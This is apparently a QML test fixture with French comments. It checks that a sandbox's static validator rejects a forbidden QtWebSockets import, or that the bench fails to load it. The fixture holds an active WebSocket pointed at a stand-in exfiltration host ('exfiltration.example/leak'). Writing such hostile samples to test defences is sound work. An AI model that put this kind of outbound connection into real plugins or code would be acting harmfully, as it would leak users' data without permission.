// Pathologique — import hors allow-list D34 (`QtWebSockets`).
//
// Attendu : rejeté en P0 (préfiltre statique static_validator, code
// `import_forbidden`) — le banc n'est JAMAIS spawné dans le pipeline réel.
//
// NOTE HARNAIS : run_corpus.ps1 pilote le banc directement, pas le P0 in-game
// (StaticValidator est du C++ in-process, tâche A4). Passé au banc, cet artefact
// échoue de toute façon au chargement (`load_failed`) : le module QtWebSockets
// n'est pas lié au banc (aucune surface réseau, doc 12 §5). Dans les deux cas,
// le code hostile n'exécute JAMAIS rien — c'est la propriété testée.
import QtQuick
import QtWebSockets

Item {
    id: root

    WebSocket {
        active: true
        url: "wss://exfiltration.example/leak"
        onTextMessageReceived: function(message) {}
    }
}
